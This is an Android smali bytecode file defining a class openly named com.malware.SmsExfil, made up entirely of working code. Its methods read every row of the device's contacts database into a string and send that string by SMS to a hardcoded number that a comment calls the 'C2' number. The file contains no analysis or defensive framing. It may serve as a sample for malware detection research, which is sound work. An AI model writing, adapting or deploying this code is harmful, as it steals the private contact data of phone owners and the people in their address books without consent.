.class public Lcom/malware/SmsExfil;
.super Ljava/lang/Object;
.source "SmsExfil.java"

.field private context:Landroid/content/Context;

.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lcom/malware/SmsExfil;->context:Landroid/content/Context;
    return-void
.end method

.method public sendStolenData(Ljava/lang/String;)V
    .locals 4
    .param p1, "data"

    # Get the SMS manager
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;
    move-result-object v0

    # Hardcoded C2 phone number
    const-string v1, "+1555012345"

    # Send SMS with stolen data
    const/4 v2, 0x0
    invoke-virtual {v0, v1, v2, p1, v2, v2}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    return-void
.end method

.method public stealContacts()Ljava/lang/String;
    .locals 5

    # Query the contacts content provider
    iget-object v0, p0, Lcom/malware/SmsExfil;->context:Landroid/content/Context;
    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v0

    sget-object v1, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;
    const/4 v2, 0x0
    invoke-virtual {v0, v1, v2, v2, v2, v2}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;
    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    :loop
    invoke-interface {v3}, Landroid/database/Cursor;->moveToNext()Z
    move-result v0
    if-eqz v0, :done

    const/4 v0, 0x0
    invoke-interface {v3, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v0
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v0, ","
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    goto :loop

    :done
    invoke-interface {v3}, Landroid/database/Cursor;->close()V
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
    return-object v0
.end method

.method public exfiltrateViaSms()V
    .locals 1

    # Steal contacts then send via SMS
    invoke-virtual {p0}, Lcom/malware/SmsExfil;->stealContacts()Ljava/lang/String;
    move-result-object v0
    invoke-virtual {p0, v0}, Lcom/malware/SmsExfil;->sendStolenData(Ljava/lang/String;)V
    return-void
.end method
